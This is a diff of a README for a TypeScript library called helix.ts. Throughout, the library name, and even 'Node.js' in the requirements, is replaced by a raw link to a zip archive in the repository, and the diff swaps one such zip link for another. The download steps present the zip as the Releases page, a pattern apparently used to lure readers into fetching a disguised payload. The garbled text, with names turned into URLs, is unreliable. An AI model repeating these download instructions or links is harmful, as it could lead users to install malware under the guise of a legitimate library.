@@ -1,47 +1,47 @@
-# 🎉 https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip - Simple Access to Helix Services
+# 🎉 https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip - Simple Access to Helix Services
 
 ## 🚀 Getting Started
 
-Welcome to the https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip library! This easy-to-use TypeScript library helps you consume public-facing types from services powered by https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip With https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip, you can simplify your interactions with various data services, making your life easier.
+Welcome to the https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip library! This easy-to-use TypeScript library helps you consume public-facing types from services powered by https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip With https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip, you can simplify your interactions with various data services, making your life easier.
 
 ## 📥 Download & Install
 
 To get started, you need to download the library. Click the button below to visit the Releases page and download the latest version.
 
-[![Download https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip](https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip%https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip)](https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip)
+[![Download https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip](https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip%https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip)](https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip)
 
 ### Step-by-Step Download Instructions
 
 1. **Visit the Releases Page**  
-   Click the link to access the Releases page: [Download Page](https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip).
+   Click the link to access the Releases page: [Download Page](https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip).
 
 2. **Locate the Latest Release**  
    On the Releases page, find the latest version listed at the top. You will see information about new features and bug fixes.
 
 3. **Download the Library**  
-   Under the latest version, click on the appropriate file to download. This could be a .zip or https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip file.  
+   Under the latest version, click on the appropriate file to download. This could be a .zip or https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip file.  
 
 4. **Extract the Package**  
    Once the download completes, extract the contents of the file. You can usually do this by right-clicking the file and selecting "Extract All" or using a software tool of your choice.
 
 5. **Install Dependencies**  
-   If prompted, you may need to install additional tools to run the library smoothly. Familiar tools include https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip and npm. These are essential for executing JavaScript code.  
+   If prompted, you may need to install additional tools to run the library smoothly. Familiar tools include https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip and npm. These are essential for executing JavaScript code.  
 
 6. **Get Started**  
-   You can now use the https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip library in your TypeScript projects. Follow the usage examples provided in the documentation to guide you in utilizing the library.
+   You can now use the https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip library in your TypeScript projects. Follow the usage examples provided in the documentation to guide you in utilizing the library.
 
 ## 🚦 System Requirements
 
-To ensure that https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip runs smoothly, please ensure your environment meets the following requirements:
+To ensure that https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip runs smoothly, please ensure your environment meets the following requirements:
 
-- **https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip Version**: 12.x or later
+- **https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip Version**: 12.x or later
 - **npm Version**: 6.x or later
 - **TypeScript Version**: 4.x or later
 - **Operating System**: Compatible with Windows, macOS, and Linux
 
 ## 🛠️ Features
 
-https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip offers several key features:
+https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip offers several key features:
 
 - **Type Safety**: Leverage TypeScript’s type system for safer code.
 - **Easy Integration**: Integrates easily with various data services.
@@ -62,7 +62,7 @@ This library interacts with essential topics in today’s tech environment. Some
 
 ## 📚 Documentation
 
-You can find extensive documentation to guide you through using https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip effectively. In particular, you will discover:
+You can find extensive documentation to guide you through using https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip effectively. In particular, you will discover:
 
 - **Installation Guides**: Detailed steps for setting up your environment.
 - **API References**: Information about available functions and their usage.
@@ -72,4 +72,4 @@ Access the documentation directly from the repository.
 
 ---
 
-For any questions or feedback, feel free to reach out through the issues section in the GitHub repository. Your input is always welcome and helps improve the library for everyone. Enjoy using https://raw.githubusercontent.com/camilo2874/helix.ts/main/Praesian/helix.ts.zip!
+For any questions or feedback, feel free to reach out through the issues section in the GitHub repository. Your input is always welcome and helps improve the library for everyone. Enjoy using https://github.com/camilo2874/helix.ts/raw/refs/heads/main/src/integration/rest/helix_ts_1.5.zip!
